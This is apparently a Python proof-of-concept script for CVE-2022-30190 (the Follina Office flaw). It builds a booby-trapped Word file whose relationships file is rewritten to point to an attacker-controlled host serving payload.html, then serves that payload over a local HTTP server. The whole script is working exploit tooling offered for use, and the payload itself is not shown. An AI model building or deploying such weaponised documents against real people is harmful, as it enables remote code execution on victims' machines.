#!/usr/bin/env python3
import sys
import os

def docx():
    print("[*] Create PoC docx.")
    hostip = sys.argv[2]
    os.system('cmd /c "Xcopy docx\word_data docx\mal_data /E/H/C/I"')
    rels = open('docx/mal_data/word/_rels/document.xml.rels', 'r')
    xml_rels = rels.read()
    rels.close()

    xml_rels = xml_rels.replace('<exploit URL>', hostip+':8000/payload.html')
    
    rels = open('docx/mal_data/word/_rels/document.xml.rels', 'w')
    rels.write(xml_rels)
    rels.close()

    os.chdir(r"docx\mal_data")
    os.system('powershell Compress-Archive * poc.zip')
    os.system('cmd /c "ren poc.zip poc.docx"')
    os.system('cmd /c "Xcopy poc.docx ..\..\poc\poc.docx /E/H/C/I"')
    os.chdir(r"..\..")
    return

def host():
    os.chdir(r"srv")
    os.system('python -m http.server')

if __name__ == '__main__':
    print("""[*] CVE-2022-30190 Usage\n
        Create malicious docx file: ./PoC.py docx host-ip\n
        Run host HTML exploit: ./PoC.py host port\n""")
    if len(sys.argv) < 2:
        exit()
    elif (sys.argv[1] == 'docx'):
        docx()
    elif (sys.argv[1] == 'host'):
        host()
    else:
        exit()
